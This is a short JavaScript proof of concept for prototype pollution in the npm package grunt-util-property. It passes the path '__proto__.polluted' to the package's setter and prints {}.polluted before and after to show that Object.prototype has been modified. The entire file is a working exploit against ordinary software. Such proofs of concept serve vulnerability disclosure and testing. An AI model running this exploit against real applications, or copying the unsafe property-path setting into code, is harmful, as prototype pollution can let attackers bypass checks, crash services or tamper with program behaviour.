var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const grunt = require('grunt');
const a = require('grunt-util-property');
console.log({}.polluted);
let b = a(grunt);
b.call(obj, '__proto__.polluted', 'yes');
console.log({}.polluted);